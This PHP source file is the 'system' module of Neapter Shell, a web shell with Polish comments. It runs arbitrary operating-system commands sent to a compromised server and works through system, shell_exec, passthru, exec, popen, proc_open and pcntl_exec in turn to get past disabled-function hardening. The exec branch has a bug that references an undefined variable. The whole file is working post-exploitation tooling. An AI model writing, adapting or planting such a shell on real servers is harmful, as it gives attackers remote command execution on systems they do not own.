<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleSystem extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'system',
            'exec'
        );
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
system - Uruchomienie polecenia systemowego

    Użycie:
        system polecenie - uruchomienie polecenia

    Przykład:
        system ls -la
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        $sCmd = $this->oArgs->getRawData();

        /**
         * Jezeli safemode jest wylaczony
         */
        if ($this->oUtils->isSafeMode()) {
            return 'Safe mode jest włączone, funkcje systemowe nie działają !!!';
        }

        if (strncmp($sCmd, 'cd ', 3) === 0) {
            chdir(substr($sCmd, 3));
        }

        ob_start();

        /**
         * system
         */
        if (!in_array('system', $this->oUtils->getDisabledFunctions())) {
            echo "system():\r\n\r\n";
            system($sCmd);
        }
        /**
         * shell_exec
         */
        else if (!in_array('shell_exec', $this->oUtils->getDisabledFunctions())) {
            echo "shell_exec():\r\n\r\n";
            echo shell_exec($sCmd);
        }
        /**
         * passthru
         */
        else if (!in_array('passthru', $this->oUtils->getDisabledFunctions())) {
            echo "passthru():\r\n\r\n";
            passthru($sCmd);
        }
        /**
         * exec
         */
        else if (!in_array('exec', $this->oUtils->getDisabledFunctions())) {
            echo "exec():\r\n\r\n";
            exec($sCmd, $aOutput);
            echo implode("\r\n", $sLine) . "\r\n";
        }
        /**
         * popen
         */
        else if (!in_array('popen', $this->oUtils->getDisabledFunctions())) {
            echo "popen():\r\n\r\n";
            $rFp = popen($sCmd, 'r');

            if (is_resource($rFp)) {
                while (!feof($rFp)) {
                    echo fread($rFp, 1024);
                }
            }
        }
        /**
         * proc_open
         */
        else if (!in_array('proc_open', $this->oUtils->getDisabledFunctions())) {
            echo "proc_open():\r\n\r\n";
            $rFp = proc_open($sCmd, array
            (
                array('pipe', 'r'),
                array('pipe', 'w')
            ),
                $aPipe
            );

            if (is_resource($rFp)) {
                while (!feof($aPipe[1])) {
                    echo fread($aPipe[1], 1024);
                    usleep(10000);
                }
            }
        }
        /**
         * pcntl_exec
         */
        else if (function_exists('pcntl_exec') && !in_array('pcntl_exec', $this->oUtils->getDisabledFunctions())) {
            echo "pcntl_exec():\r\n\r\n";
            $sPath = NULL;
            $aArgs = array();
            if (($iPos = strpos($sCmd, ' ')) === FALSE) {
                $sPath = $sCmd;
            } else {
                $sPath = substr($sCmd, 0, $iPos);
                $aArgs = explode(' ', substr($sCmd, $iPos + 1));
            }
            pcntl_exec($sPath, $aArgs);
        } else {
            echo 'Wszystkie funkcje systemowe są poblokowane !!!';
        }

        $sData = "Command: '$sCmd'\r\nPHP function: " . ob_get_contents();
        ob_clean();
        ob_end_flush();

        return htmlspecialchars($sData);
    }

}
